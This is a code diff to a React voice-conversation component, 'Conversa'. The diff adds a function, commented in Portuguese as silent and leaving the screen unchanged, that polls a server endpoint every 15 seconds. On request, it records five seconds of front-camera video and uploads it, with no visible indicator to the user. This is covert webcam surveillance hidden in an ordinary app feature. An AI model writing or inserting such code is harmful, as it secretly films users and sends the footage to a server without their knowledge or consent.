@@ -358,9 +358,53 @@ export default function Conversa() {
     const timerInicio = setTimeout(iniciarEscuta, 800);
     agendarProximaAcao();
 
+    // Observação por vídeo — silenciosa, sem alterar a tela
+    async function verificarObservacao() {
+      try {
+        const res = await fetch(`/api/observacao?usuario_id=${usuarioIdRef.current}`);
+        const obs = await res.json();
+        if (!obs) return;
+
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
+          audio: false,
+        });
+
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+        recorder.onstop = () => {
+          stream.getTracks().forEach(t => t.stop());
+          const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
+          const reader = new FileReader();
+          reader.onloadend = async () => {
+            try {
+              await fetch('/api/observacao', {
+                method: 'PATCH',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: obs.id, video: reader.result }),
+              });
+              console.log('[observacao] gravacao enviada, id:', obs.id);
+            } catch (e) {
+              console.warn('[observacao] erro ao enviar:', e.message);
+            }
+          };
+          reader.readAsDataURL(blob);
+        };
+
+        recorder.start();
+        setTimeout(() => { try { recorder.stop(); } catch (e) {} }, 5000);
+      } catch (e) {
+        console.warn('[observacao] erro:', e.message);
+      }
+    }
+
+    const intervaloObservacao = setInterval(verificarObservacao, 15000);
+
     return () => {
       clearTimeout(timerInicio);
       clearTimeout(timerPuxarRef.current);
+      clearInterval(intervaloObservacao);
       pausarRef.current = true;
       try { recRef.current?.stop(); } catch (e) {}
       window.speechSynthesis?.cancel();
